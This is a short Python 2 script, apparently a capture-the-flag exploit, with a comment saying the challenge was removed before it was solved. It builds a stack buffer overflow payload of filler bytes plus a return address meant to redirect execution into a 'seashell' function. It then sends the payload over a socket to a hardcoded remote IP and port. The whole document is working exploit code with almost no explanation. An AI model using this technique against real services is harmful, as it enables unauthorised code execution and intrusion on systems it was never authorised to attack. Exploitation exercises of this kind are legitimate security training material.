# This problem was removed from the competition before a solution was retrieved

import socket
import struct

HOST = "104.236.80.67"
PORT = 5685

def pack(p):
    return struct.pack('<I', p)

payload = ""
payload += 'AAAA'*16
payload += pack(0x080484b4) # Let's overwrite EIP so that we jump into the seashell function :)

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    sock.sendall(payload + '\n')
    print sock.recv(1024)
    print sock.recv(1024)
    sock.close()

main()
